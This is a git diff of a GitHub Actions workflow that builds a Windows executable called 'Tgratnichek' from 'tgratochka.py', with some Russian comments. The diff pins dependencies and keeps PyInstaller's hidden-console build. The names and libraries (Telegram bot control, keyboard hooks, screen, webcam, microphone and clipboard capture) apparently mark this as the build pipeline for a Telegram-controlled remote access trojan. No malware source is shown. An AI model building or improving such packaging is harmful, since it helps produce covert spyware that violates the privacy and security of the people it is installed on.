@@ -1,16 +1,16 @@
-name: Build Windows EXE (Stable)
+name: Build Windows EXE (Stable onedir)
 
 on:
   push:
     branches: [ main ]
-  workflow_dispatch:  # позволяет запустить вручную
+  workflow_dispatch:
 
 jobs:
   build:
     runs-on: windows-latest
 
     steps:
-    - name: Checkout repository
+    - name: Checkout code
       uses: actions/checkout@v4
 
     - name: Set up Python 3.12
@@ -21,17 +21,31 @@ jobs:
     - name: Upgrade pip
       run: python -m pip install --upgrade pip
 
-    - name: Install all dependencies
+    - name: Install dependencies (stable versions)
       run: |
         pip install pyinstaller
-        pip install pyTelegramBotAPI pyautogui pynput opencv-python pillow sounddevice numpy scipy pyperclip psutil requests pywin32 qrcode plyer pygetwindow
+        pip install pyTelegramBotAPI==4.22.1
+        pip install pyautogui==0.9.54
+        pip install pynput==1.7.6
+        pip install opencv-python-headless==4.10.0.84
+        pip install pillow==10.4.0
+        pip install sounddevice==0.5.0
+        pip install numpy==1.26.4
+        pip install scipy==1.13.1
+        pip install pyperclip==1.9.0
+        pip install psutil==6.0.0
+        pip install requests==2.32.3
+        pip install pywin32==306
+        pip install qrcode==7.4.2
+        pip install plyer==2.1.0
+        pip install pygetwindow==0.0.9
 
-    - name: Build EXE in onedir mode (stable for DLL)
+    - name: Build EXE (onedir - для стабильности всех DLL)
       run: |
         pyinstaller --onedir --noconsole --name Tgratnichek tgratochka.py
 
-    - name: Upload result folder as artifact
+    - name: Upload EXE folder (скачиваем папку)
       uses: actions/upload-artifact@v4
       with:
-        name: Tgratnichek-Folder
+        name: sosa4ka
         path: dist/Tgratnichek
